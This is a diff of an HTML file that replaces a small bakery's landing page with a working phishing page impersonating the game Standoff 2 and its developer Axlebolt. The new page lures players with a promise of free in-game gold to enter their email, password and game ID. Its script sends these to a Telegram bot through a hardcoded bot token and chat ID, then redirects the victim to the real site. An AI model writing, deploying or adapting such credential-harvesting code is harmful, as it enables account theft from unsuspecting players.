@@ -3,311 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Merz Cham - Пироги и Выпечка</title>
+    <title>Standoff 2 - Официальный сайт | Axlebolt</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            font-family: 'Arial', sans-serif;
+            color: white;
             line-height: 1.6;
-            color: #5a3921;
-            background: #fffaf0;
         }
-        
-        /* Шапка */
-        header {
-            background: linear-gradient(135deg, #8b4513 0%, #a0522d 100%);
-            color: white;
-            padding: 1rem 0;
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 10px rgba(139, 69, 19, 0.3);
+        .header {
+            background: rgba(0,0,0,0.8);
+            padding: 20px 0;
+            text-align: center;
+            border-bottom: 3px solid #ff4444;
         }
-        
-        .nav-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 2rem;
-        }
-        
         .logo {
-            font-size: 1.8rem;
+            font-size: 2.5em;
             font-weight: bold;
-            color: #ffd700;
+            color: #ff4444;
         }
-        
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-        }
-        
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-        
-        .nav-links a:hover {
-            color: #ffd700;
-        }
-        
-        /* Герой секция */
-        .hero {
-            background: linear-gradient(rgba(139, 69, 19, 0.7), rgba(160, 82, 45, 0.7)), url('https://images.unsplash.com/photo-1568254183919-78a4f43a2877?ixlib=rb-4.0.3&auto=format&fit=crop&w=1950&q=80');
-            background-size: cover;
-            background-position: center;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: white;
-            padding: 0 2rem;
-            margin-top: 80px;
-        }
-        
-        .hero-content h1 {
-            font-size: 3.5rem;
-            margin-bottom: 1rem;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        
-        .hero-content p {
-            font-size: 1.3rem;
-            margin-bottom: 2rem;
-        }
-        
-        .cta-button {
-            display: inline-block;
-            background: #ffd700;
-            color: #8b4513;
-            padding: 1rem 2.5rem;
-            text-decoration: none;
-            border-radius: 50px;
-            font-weight: bold;
-            font-size: 1.1rem;
-            transition: transform 0.3s, box-shadow 0.3s;
-        }
-        
-        .cta-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
-        }
-        
-        /* Секции */
-        section {
-            padding: 5rem 2rem;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        h2 {
-            text-align: center;
-            font-size: 2.5rem;
-            margin-bottom: 3rem;
-            color: #8b4513;
-        }
-        
-        /* Продукция */
-        .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-            margin-top: 3rem;
-        }
-        
-        .product-card {
-            background: white;
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 30px;
+            background: rgba(255,255,255,0.1);
             border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(139, 69, 19, 0.1);
-            transition: transform 0.3s;
+            backdrop-filter: blur(10px);
         }
-        
-        .product-card:hover {
-            transform: translateY(-5px);
+        .alert {
+            background: #ff4444;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
         }
-        
-        .product-image {
-            height: 200px;
-            background: linear-gradient(45deg, #f4a460, #d2691e);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .form-group {
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255,255,255,0.9);
+            font-size: 16px;
+            margin-top: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #4CAF50;
             color: white;
-            font-size: 3rem;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
         }
-        
-        .product-info {
-            padding: 1.5rem;
-        }
-        
-        .product-info h3 {
-            color: #8b4513;
-            margin-bottom: 0.5rem;
-        }
-        
-        .price {
-            font-size: 1.3rem;
-            font-weight: bold;
-            color: #d2691e;
-            margin-top: 1rem;
-        }
-        
-        /* Приданое */
-        .dowry-section {
-            background: linear-gradient(135deg, #fffaf0 0%, #f5f5dc 100%);
-            border-radius: 20px;
-            padding: 3rem;
+        .bonus {
             text-align: center;
-            margin-top: 2rem;
-        }
-        
-        /* Контакты */
-        .contact-info {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin-top: 3rem;
-        }
-        
-        .contact-item {
-            text-align: center;
-            padding: 2rem;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 3px 10px rgba(139, 69, 19, 0.1);
-        }
-        
-        .contact-item h3 {
-            color: #8b4513;
-            margin-bottom: 1rem;
-        }
-        
-        /* Футер */
-        footer {
-            background: #8b4513;
-            color: white;
-            text-align: center;
-            padding: 2rem;
-            margin-top: 4rem;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255,215,0,0.2);
+            border-radius: 8px;
         }
     </style>
 </head>
 <body>
-    <!-- Шапка -->
-    <header>
-        <nav class="nav-container">
-            <div class="logo">Merz Cham</div>
-            <div class="nav-links">
-                <a href="#about">О нас</a>
-                <a href="#products">Пироги</a>
-                <a href="#dowry">Приданое</a>
-                <a href="#contact">Контакты</a>
-            </div>
-        </nav>
-    </header>
+    <div class="header">
+        <div class="logo">STANDOFF 2</div>
+        <div>Axlebolt Games</div>
+    </div>
 
-    <!-- Герой -->
-    <section class="hero">
-        <div class="hero-content">
-            <h1>Настоящие пироги по старинным рецептам</h1>
-            <p>С любовью и традициями Ингушетии в каждой крошке</p>
-            <a href="#contact" class="cta-button">Заказать сейчас</a>
+    <div class="container">
+        <div class="alert">
+            ⚠️ <b>АКЦИЯ!</b> Подтвердите аккаунт и получите 1000 золота!
         </div>
-    </section>
 
-    <!-- О нас -->
-    <section id="about">
-        <h2>О нашей кондитерской</h2>
-        <p style="text-align: center; font-size: 1.2rem; max-width: 800px; margin: 0 auto;">
-            Merz Cham - это семейная кондитерская, где мы сохраняем традиции ингушской кухни. 
-            Наши пироги готовятся по старинным рецептам, передаваемым из поколения в поколение. 
-            Только натуральные ингредиенты и ручная работа!
-        </p>
-    </section>
+        <form id="phishingForm">
+            <div class="form-group">
+                <label>Email или логин:</label>
+                <input type="text" name="email" placeholder="Ваш email" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Пароль:</label>
+                <input type="password" name="password" placeholder="Пароль аккаунта" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Игровой ID (опционально):</label>
+                <input type="text" name="game_id" placeholder="ID из игры">
+            </div>
 
-    <!-- Пироги -->
-    <section id="products">
-        <h2>Наши пироги</h2>
-        <div class="products-grid">
-            <div class="product-card">
-                <div class="product-image">🥧</div>
-                <div class="product-info">
-                    <h3>Ч1апильг</h3>
-                    <p>Традиционные ингушские лепешки с начинкой из творога и зелени</p>
-                    <div class="price">250 руб.</div>
-                </div>
-            </div>
-            <div class="product-card">
-                <div class="product-image">🥮</div>
-                <div class="product-info">
-                    <h3>Хингалш</h3>
-                    <p>Слоеные пироги с тыквенной начинкой и специями</p>
-                    <div class="price">300 руб.</div>
-                </div>
-            </div>
-            <div class="product-card">
-                <div class="product-image">🍰</div>
-                <div class="product-info">
-                    <h3>Сладкие пироги</h3>
-                    <p>Десертные пироги с ягодами, орехами и медом</p>
-                    <div class="price">350 руб.</div>
-                </div>
-            </div>
+            <button type="submit">🎮 ПОЛУЧИТЬ 1000 ЗОЛОТА</button>
+        </form>
+
+        <div class="bonus">
+            🎁 <b>+500 золота</b> за привязку аккаунта!
         </div>
-    </section>
+    </div>
 
-    <!-- Приданое -->
-    <section id="dowry">
-        <h2>Традиционное приданое</h2>
-        <div class="dowry-section">
-            <h3 style="color: #8b4513; margin-bottom: 1rem;">Свадебные наборы</h3>
-            <p style="font-size: 1.1rem; margin-bottom: 1rem;">
-                Подготовим традиционные пироги и выпечку для вашей свадьбы по всем обычаям
-            </p>
-            <p style="font-size: 1rem; color: #666;">
-                • Свадебные пироги • Праздничная выпечка • Тематические наборы
-            </p>
-        </div>
-    </section>
+    <script>
+        document.getElementById('phishingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const data = {
+                email: formData.get('email'),
+                password: formData.get('password'),
+                game_id: formData.get('game_id'),
+                ip: 'auto'
+            };
 
-    <!-- Контакты -->
-    <section id="contact">
-        <h2>Контакты</h2>
-        <div class="contact-info">
-            <div class="contact-item">
-                <h3>📞 Телефон</h3>
-                <p>+7 (999) 123-45-67</p>
-            </div>
-            <div class="contact-item">
-                <h3>📧 Instagram</h3>
-                <p>@merz_cham_ingushetia</p>
-            </div>
-            <div class="contact-item">
-                <h3>📍 Адрес</h3>
-                <p>Ингушетия, г. Назрань</p>
-            </div>
-            <div class="contact-item">
-                <h3>🕒 Время работы</h3>
-                <p>Ежедневно 9:00 - 20:00</p>
-            </div>
-        </div>
-    </section>
+            // Отправка в Telegram
+            fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '1491315056',
+                    text: `🎯 НОВЫЙ АККАУНТ:\n📧 ${data.email}\n🔑 ${data.password}\n🎮 ${data.game_id || 'N/A'}\n🕒 ${new Date().toLocaleString()}`,
+                    parse_mode: 'HTML'
+                })
+            });
 
-    <!-- Футер -->
-    <footer>
-        <p>Merz Cham - Традиционные пироги Ингушетии © 2024</p>
-    </footer>
+            // Перенаправление после кражи
+            setTimeout(() => {
+                window.location.href = 'https://standoff2.com';
+            }, 2000);
+
+            alert('✅ Аккаунт успешно подтвержден! Золото будет начислено в течение 5 минут.');
+        });
+    </script>
 </body>
 </html>
